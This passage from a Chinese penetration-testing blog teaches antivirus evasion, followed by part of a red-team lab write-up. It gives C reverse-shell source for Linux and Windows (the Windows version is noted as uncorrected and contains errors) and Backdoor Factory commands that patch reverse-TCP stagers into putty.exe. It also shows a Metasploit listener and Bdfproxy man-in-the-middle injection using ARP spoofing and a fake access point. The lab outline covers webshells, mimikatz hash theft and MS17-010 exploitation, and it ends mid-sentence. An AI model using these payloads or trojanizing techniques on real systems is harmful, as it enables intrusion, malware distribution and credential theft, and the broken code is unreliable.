<p><img src="/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8%5C20190413174142304.png" alt="在这里插入图片描述"></p>
<ul>
<li>linux_revers_shell.c</li>
</ul>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sock</span>;</span></span><br><span class="line">	<span class="keyword">int</span> s;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"uso: 192.168.153.166 4444\n"</span>); <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	sock.sin_family  = AF_INET;</span><br><span class="line">	sock.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">	sock.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]);</span><br><span class="line">	s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">connect</span>(s,(struct sockaddr_in *)&amp;sock, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">	</span><br><span class="line">	dup2(s,<span class="number">0</span>);</span><br><span class="line">	dup2(s,<span class="number">1</span>);</span><br><span class="line">	dup2(s,<span class="number">2</span>);</span><br><span class="line">	execl(<span class="string">"/bin/sh"</span>,<span class="string">"httpd"</span>,(<span class="keyword">char</span> *)<span class="number">0</span>); <span class="comment">//precess httpd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>windows.c</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"># 未修正错误</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	SOCKET Winsock;</span><br><span class="line">	SOOKET Sock;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line">	<span class="keyword">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">	STARTUPINFO ini_processo;</span><br><span class="line">	PROCESS_INFORMATION processo_info;</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function">	<span class="title">WSAStartup</span><span class="params">(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), wsaData)</span></span>;</span><br><span class="line">	winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">	&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>;) <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">	host = gethostbyname(argv [<span class="number">1</span>] );</span><br><span class="line">	<span class="built_in">strcpy</span>(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">	hax.sin_family = AF_INET;</span><br><span class="line">	hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">	hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">	WSAConnect(Winsock,(SOCKADDR* &amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">	ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">	ini_processo.dwFlags = START_USESTDHANDLES;</span><br><span class="line">	ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">	CreateProcess(<span class="literal">NULL</span>,<span class="string">"cmd exe"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;process_info);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/20190413174154985.png" alt="在这里插入图片描述"></p>
<h4 id="后门工具–Backdoor-factory"><a href="#后门工具–Backdoor-factory" class="headerlink" title="后门工具–Backdoor-factory"></a>后门工具–Backdoor-factory</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>patch<ul>
<li>通过替换 exe、dll、注册表等方法修复系统漏洞或问题的方法</li>
<li>bdf：向二进制文件中增加或者删除代码内容<ul>
<li>某些受保护的二进制程序无法 patch</li>
<li>存在一定概率问价你会被 patch 坏掉</li>
</ul>
</li>
</ul>
</li>
<li>后门工厂<ul>
<li>使用于 windows PE x32/64 和 linux ELF x32/64 （OSX）</li>
<li>支持 msf payload、自定义 payload</li>
</ul>
</li>
<li>将 shellcode 代码 patch 进模板文件，躲避 AV 检查</li>
<li>python 语言编写</li>
<li>msf 使用的 patch 方法<ul>
<li>覆盖程序入口<ul>
<li>msfvenom -p windows/shell/reverse_tcp</li>
</ul>
</li>
<li>创建新的线程执行 shellcode 并跳回原程序入口<ul>
<li>msfvenom -p windows/shell/reverse_tcp –k</li>
<li>增加代码片段跳转执行后跳回源程序入口</li>
</ul>
</li>
</ul>
</li>
<li>CTP 方法<ul>
<li>增加新的代码段 session，与 smf 的-k 方法类似</li>
<li>使用现有的代码裂缝/洞（code cave）存放 shellcode</li>
</ul>
</li>
<li>代码洞<ul>
<li>二进制中超过两个字节的连续 x00 区域（代码片段间区域）</li>
<li>根据统计判断代码洞是编译在进行编译是造成的，不同的编译器造成的代码洞的大小不同</li>
</ul>
</li>
<li>单个代码洞代销不足以存放完整的 shellcode<ul>
<li>多代码洞跳转（非顺序执行）<ul>
<li>初期免杀率可达100%</li>
</ul>
</li>
<li>结合 msf 的 stager 方法</li>
</ul>
</li>
<li>patch 选项<ul>
<li>附加代码段</li>
<li>单代码洞注入</li>
<li>多代码注入</li>
</ul>
</li>
<li>BDF 基本使用<ul>
<li>检查二进制文件是否支持代码注入<ul>
<li>backdoor-factory -f putty.exe –S</li>
</ul>
</li>
<li>显示可用 payload<ul>
<li>backdoor-factory -f putty.exe -s show</li>
<li>backdoor-factory -f <code>which nc</code> -s show</li>
<li>backdoor-factory -f putty.exe -s show iat_reverse_tcp_stager_threaded -H 10.10.10.133 -P 4444</li>
<li>默认单一代码洞，选项 .rdata –&gt; 查看文件 –&gt; 查病毒</li>
<li>使用 msf 侦听 set payload windows/meterpreter/revers_tcp set LHOST 10.10.10.131 set LPORT 4444 run</li>
</ul>
</li>
<li>查看 cave 大小<ul>
<li>ackdoor-factory -f putty.exe -c -l</li>
</ul>
</li>
</ul>
</li>
<li>免杀效果对比<ul>
<li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666</li>
<li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J</li>
<li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.20.8 -P 6666 -a</li>
</ul>
</li>
<li>与 veil-evasion 集成</li>
<li>Linux：backdoor-factory -f putty.exe -s show</li>
<li>IAT：import address table</li>
<li>指针指向 WinAPI 地址，被称为 thunks （形实转换程序），地址预定义</li>
</ul>
<h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><ul>
<li><p>-S：检查二进制文件是否支持代码注入</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe –S</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><img src="/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>-c: 在确定其支持patch 后，我们再来查看其是否支持我们指定的 shellcode patch</li>
</ul>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">-c：code cave(代码裂缝)</span><br><span class="line">-l：代码裂缝大小</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe -c -l 200</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>-s SHELL, –shell=SHELL: 可以使用的有效负载。使用“show”来查看有效载荷</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">root<span class="meta">@kali</span>:~# backdoor-<span class="keyword">factory</span> -f putty.exe -s <span class="keyword">show</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">root<span class="meta">@kali</span>:~# backdoor-<span class="keyword">factory</span> -f `which nc` -s <span class="keyword">show</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>注入 putty.exe，报错</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> -o putty2.exe</span><br></pre></td></tr></table></figure>

</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">[!]</span> <span class="attr">Enter your selection:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>显示未找到文件</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">Failed to read certificate <span class="string">file:</span> <span class="regexp">/usr/</span>share<span class="regexp">/backdoor-factory/</span>certs/Verisign.cer</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">02001002</span>:system <span class="string">library:</span><span class="string">fopen:</span>No such file or <span class="string">directory:</span>bss_file.<span class="string">c:</span><span class="number">175</span>:fopen(<span class="string">'/usr/share/backdoor-factory/certs/VerisignPrivateKey.pem'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">2006</span><span class="string">D080:</span>BIO <span class="string">routines:</span><span class="string">BIO_new_file:</span>no such <span class="string">file:</span>bss_file.<span class="string">c:</span><span class="number">182</span>:</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">02001002</span>:system <span class="string">library:</span><span class="string">fopen:</span>No such file or <span class="string">directory:</span>bss_file.<span class="string">c:</span><span class="number">175</span>:fopen(<span class="string">'/usr/share/backdoor-factory/certs/Verisign.cer'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">2006</span><span class="string">D080:</span>BIO <span class="string">routines:</span><span class="string">BIO_new_file:</span>no such <span class="string">file:</span>bss_file.<span class="string">c:</span><span class="number">182</span>:</span><br><span class="line">Failed</span><br><span class="line">File putty5.exe is <span class="keyword">in</span> the <span class="string">'backdoored'</span> directory</span><br></pre></td></tr></table></figure>
</li>
<li><p>修复错误（备份并重命名）</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /usr/share/backdoor-factory/certs/</span></span><br><span class="line">passFile.txt           signingCert.cer        signingPrivateKey.pem  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cd /usr/share/backdoor-factory/certs/</span></span><br><span class="line">  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># cp signingCert.cer signingCert.cer.bak</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># mv signingCert.cer Verisign.cer</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># cp signingPrivateKey.pem signingPrivateKey.pem.bak</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># mv signingPrivateKey.pem VerisignPrivateKey.pem</span></span><br><span class="line">  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 msf 侦听</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/<span class="keyword">handler</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> LHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> LPORT <span class="number">4444</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; run</span><br></pre></td></tr></table></figure>
</li>
<li><p>windows 运行被注入 putty2.exe 程序，kali 反弹成功</p>
</li>
<li><p>免杀效果比较</p>
<p><a href="http://www.virscan.org/scan/" target="_blank" rel="noopener">查病毒网站：http://www.virscan.org/scan/</a></p>
</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> --output-file=putty3.exe</span><br><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> --output-file=putty4.exe –J</span><br><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> --output-file=putty5.exe -a</span><br></pre></td></tr></table></figure>

<ul>
<li><p>与 veil-evasion 集成</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">root@kali:~# veil-evasion</span><br><span class="line">[<span class="symbol">menu&gt;&gt;</span>]: <span class="link">list</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="后门工具–Bdfproxy"><a href="#后门工具–Bdfproxy" class="headerlink" title="后门工具–Bdfproxy"></a>后门工具–Bdfproxy</h4><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
<li>Bdfproxy（mitmproxy）<ul>
<li>基于流量劫持（中间人攻击）动态注入 shellcode （ARP spoof、DNS spoof、Fake AP）</li>
</ul>
</li>
<li>步骤<ul>
<li>sysctl -w net.ipv4.ip_forward=1</li>
<li>iptables -t nat -A PREROUTING -p tcp –dport 80/443 -j REDIRECT –to-ports 8080</li>
<li>vi /etc/bdfproxy/bdfproxy.cfg<ul>
<li>proxyMode = transparent<br>修改侦听 IP 地址bdfproxy</li>
</ul>
</li>
</ul>
</li>
<li>arpspoof -i eth0 -t 1.1.1.2 1.1.1.1</li>
<li>启动 msf</li>
<li>流程<ul>
<li>mana 创建 Fack AP</li>
<li>badfproxy 代理注入代码</li>
<li>msf 侦听反弹 shell</li>
</ul>
</li>
</ul>
<h4 id="2-使用-1"><a href="#2-使用-1" class="headerlink" title="2.使用"></a>2.使用</h4><ul>
<li><p>修改 IP 转发</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># vim /etc/sysctl.conf </span></span><br><span class="line">net.ipv4.ip_forward=<span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改 iptables</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">root@kali:~# iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">root@kali:~# iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改配置文件</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# vim /etc/bdfproxy/bdfproxy.cfg</span><br><span class="line">proxyMode = transparent  </span><br><span class="line">HOST = <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span>     #<span class="number">108</span>行，<span class="number">117</span>行，<span class="number">128</span>行，替换所有的，有<span class="number">6</span>个</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动 bdfproxy</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># bdfproxy</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>启动 msfconsole</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># msfconsole -r /root/bdfproxy_msf_resource.rc</span></span><br><span class="line">msf exploit(multi/handler) &gt; jobs</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>arp 欺骗</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# arpspoof -i eth0 -t <span class="number">10.10</span><span class="number">.10</span><span class="number">.133</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>靶机访问浏览器下载软件，并运行</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//i.imgur.com/1qLFgFZ.png)</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="3-无线流量劫持"><a href="#3-无线流量劫持" class="headerlink" title="3.无线流量劫持"></a>3.无线流量劫持</h4><ul>
<li><p>vi /etc/mana-toolkit/hostapd-mana.conf</p>
<ul>
<li>修改无线 SSID 名称</li>
</ul>
</li>
<li><p>./usr/share/mana-toolkit/run-mana/start-nat-simple.sh</p>
<ul>
<li>修改 wlan1 无线网卡适配器并启动</li>
<li>iptables -t nat -A PREROUTING -i $phy -p tcp –dport 80/443 -j REDIRECT –to-port 8080</li>
</ul>
</li>
<li><p>vi /etc/bdfproxy/bdfproxy.cfg</p>
<ul>
<li>proxyMode = transparent</li>
<li>修改侦听 IP 地址并启动 badfproxy</li>
</ul>
</li>
<li><p>启动 msf</p>
<ul>
<li>msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</li>
</ul>
</li>
<li><p>补充内容</p>
<ul>
<li>全站 HTTPS 防注入（微软每个补丁都带码）</li>
<li>PE 文件证书签名可被清除</li>
<li>PE Header -&gt; Optional Header -&gt; Certificate Table(Address and size)<ul>
<li>全部用 0 覆盖</li>
<li>BDF 默认清除数字签名</li>
</ul>
</li>
</ul>
</li>
<li><p><a href="https://live.sysinternals.com/" target="_blank" rel="noopener">https://live.sysinternals.com/</a></p>
<ul>
<li>这是允许访问所有Sysinternals公用程序的文件共享。我们已经开发了这个功能来测试我们实用程序的替代分配机制。</li>
<li>这将允许您从任何连接到互联网的计算机运行这些工具，而无需导航到网页，下载并解压zip文件。</li>
</ul>
</li>
<li><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/" target="_blank" rel="noopener">Sysinternals网站</a></p>
<ul>
<li>Sysinternals网站由Mark Russinovich于1996年创建，主办他先进的系统实用程序和技术信息。无论您是IT专业人员还是开发人员，您都可以找到Sysinternals实用程序来帮助您管理，诊断和诊断Windows系统和应用程序。</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
  </entry>
  <entry>
    <title>红日安全ATT&amp;CK靶场总结</title>
    <url>/2020/06/05/hong-ri-an-quan-att-ck-ba-chang-zong-jie/</url>
    <content><![CDATA[<h2 id="红日安全ATT-amp-CK靶场-一"><a href="#红日安全ATT-amp-CK靶场-一" class="headerlink" title="红日安全ATT&amp;CK靶场(一)"></a>红日安全ATT&amp;CK靶场(一)</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>此文只记录打靶机过程的思路，因为我也是基本按照其他师傅的过程学习的，所以具体的过程可以去看其他师傅的文章。这里只记录下思路与过程。</p>
<h3 id="红队实战-一）："><a href="#红队实战-一）：" class="headerlink" title="红队实战(一）："></a>红队实战(一）：</h3><h5 id="详细教程："><a href="#详细教程：" class="headerlink" title="详细教程："></a>详细教程：</h5><p><a href="https://www.freebuf.com/column/230476.html" target="_blank" rel="noopener">https://www.freebuf.com/column/230476.html</a></p>
<p><a href="https://www.freebuf.com/column/230725.html" target="_blank" rel="noopener">https://www.freebuf.com/column/230725.html</a></p>
<p><strong>拓扑结构：</strong></p>
<p><img src="/2020/06/05/hong-ri-an-quan-att-ck-ba-chang-zong-jie/t018915c37beca70abc.png" alt></p>
<h4 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透:"></a>外网渗透:</h4><h5 id="思路一"><a href="#思路一" class="headerlink" title="思路一:"></a>思路一:</h5><ul>
<li><strong>nmap探测存活主机和端口，发现80开放。</strong></li>
</ul>
<p>​        <a href="https://blog.csdn.net/qq_37964989/article/details/84330693" target="_blank" rel="noopener">nmap常用命令总结</a></p>
<ul>
<li><strong>御剑、或dirmap、dirsearch等进行目录扫描</strong></li>
</ul>
<p>我用的dirmap,可以几个都试试:<a href="https://github.com/H4ckForJob/dirmap" target="_blank" rel="noopener">https://github.com/H4ckForJob/dirmap</a></p>
<ul>
<li><strong>识别网站指纹，发现为yxcms。</strong><ul>
<li>云悉指纹:<a href="https://www.yunsee.cn/" target="_blank" rel="noopener">https://www.yunsee.cn/</a></li>
<li>潮汐指纹:<a href="http://finger.tidesec.net/" target="_blank" rel="noopener">http://finger.tidesec.net/</a></li>
<li>who ami:<a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/</a></li>
</ul>
</li>
<li><strong>搜索yxcms网站漏洞，找到默认后台，弱口令成功登录。</strong></li>
</ul>
<p>​          <a href="https://www.freebuf.com/column/162886.html" target="_blank" rel="noopener">yxcms app 1.4.6 漏洞集合</a></p>
<ul>
<li><strong>yxcms后台，直接在前台index模板中插入一句话木马。</strong></li>
</ul>
<p><a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">后台拿webshell的方法总结</a></p>
<ul>
<li><strong>菜刀连接，即可获得后门</strong></li>
<li>常见的webshell管理工具<ul>
<li><a href="https://www.uedbox.com/post/8136/" target="_blank" rel="noopener">中国蚁剑AntSword</a></li>
<li><a href="https://www.uedbox.com/post/51677/" target="_blank" rel="noopener">中国菜刀 (caidao)</a></li>
<li><a href="https://www.uedbox.com/post/51031/" target="_blank" rel="noopener">冰蝎 webshell</a></li>
<li>cknife (c刀)</li>
<li><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">webshell收集i项目</a></li>
</ul>
</li>
</ul>
<h5 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h5><ul>
<li><strong>nmap探测存活主机和端口，发现80开放</strong>。</li>
<li><strong>御剑、或dirmap、dirsearch等进行目录扫描</strong></li>
<li><strong>发现phpmyadmin,弱口令root，root登录。</strong></li>
<li><strong>phpmyadmin通过开启全局日志的方式getshell，</strong></li>
</ul>
<p>​      <a href="https://www.cnblogs.com/0nc3/p/12071314.html" target="_blank" rel="noopener">[phpmyadmin后台getshell方法学习总结]</a></p>
<h4 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h4><ul>
<li><strong>1.使用msfvenom生成payload文件，使用菜刀上传到WWW目录下，msf监听连接。</strong></li>
</ul>
<p>​      <a href="https://shu1l.github.io/2020/04/27/msf-fan-dan-payload-xue-xi/">MSF反弹payload学习</a></p>
<ul>
<li><p><strong>查看获得的用户权限，通常通过web漏洞获得的webshell权限较低，需要进行提权。</strong></p>
<p>windows提权exp： <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener">Windows-Exploit-Suggester</a></p>
</li>
<li><p><strong>这里直接使用getsystem即可提权</strong>，<strong>如果不成功可以使用msf中自带的绕过UAC模块，设置执行后再次尝试getsystem就可获得权限</strong></p>
</li>
</ul>
<p>​       <a href="https://www.freebuf.com/articles/system/185311.html" target="_blank" rel="noopener">使用Metasploit绕过UAC的多种方法 </a></p>
<ul>
<li><strong>然后我们就可以执行一些后渗透的常规姿势，添加管理员，开3389，关防火墙，主机信息收集,后门植入等等</strong></li>
</ul>
<p>​       <a href="https://xz.aliyun.com/t/2536#toc-0" target="_blank" rel="noopener">后渗透之meterpreter使用攻略</a></p>
<ul>
<li><p><strong>mimikatz抓取本地用户的hash密码</strong></p>
<p><a href="https://www.cnblogs.com/-mo-/p/11890232.html" target="_blank" rel="noopener">后渗透]Mimikatz使用大全</a></p>
</li>
<li><p><strong>后渗透信息收集</strong>，<strong>包括定位域控，查询域管理员和域用户，添加域管理员等等</strong></p>
</li>
<li><p>利用powershell框架进行后渗透信息收集:</p>
<ul>
<li><a href="https://www.freebuf.com/sectool/87647.html" target="_blank" rel="noopener">一些值得收藏的PowerShell工具</a></li>
<li><a href="https://www.secpulse.com/archives/55893.html" target="_blank" rel="noopener">Powershell &amp; Powersploit 入门</a></li>
<li><a href="https://www.secpulse.com/archives/73766.html" target="_blank" rel="noopener">内网工具学习之Empire后渗透</a></li>
<li><a href="https://www.cnblogs.com/-qing-/p/10742487.html" target="_blank" rel="noopener">nishang的介绍与使用</a></li>
<li>域渗透信息收集常见操作<ul>
<li><a href="https://xz.aliyun.com/t/7777#toc-0" target="_blank" rel="noopener">内网信息收集</a></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>根据信息收集，我们可以知道域控的地址，域成员主机03地址。</strong></p>
</li>
<li><p><strong>接着进行横向渗透，首先需要添加路由和代理。</strong></p>
</li>
</ul>
<p>​       <a href="https://evoa.me/index.php/archives/37/" target="_blank" rel="noopener">[MSF学习-端口转发代理及路由功能-三层内网靶场渗透]</a></p>
<ul>
<li><strong>添加路由成功后，可以根据作者给出的漏洞列表直接用msf里的模块打（服务默认需要手动开启）</strong></li>
</ul>
<p><a href="https://p2.ssl.qhimg.com/t0165052491af946555.png" target="_blank" rel="noopener"><img src="/2020/06/05/hong-ri-an-quan-att-ck-ba-chang-zong-jie/D:%5Cblog%5Csource_posts%5C%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8ATT-CK%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93%5Ct0165052491af946555.png" alt="img"></a></p>
<ul>
<li><strong>利用ms17-010获取2003机器的shell，这里吐槽下msf自带的模块，就没打成功过。。</strong></li>
</ul>
<p>​       这里给一个比较好用的模块：<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="noopener">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a></p>
<p>​         先知一篇讲永恒之蓝的文章 ： <a href="https://xz.aliyun.com/t/2151#toc-1" target="_blank" rel="noopener">那些年，我们追过的“蓝”</a></p>
<ul>
<li><p><strong>2003我们直接getsystem提权，然后照上面操作导出用户hash即可。</strong></p>
</li>
<li><p>最后杀向域控，前面我们已经在win7机器上获取了域管理的账号密码。这里直接用</p>
</li>
</ul>
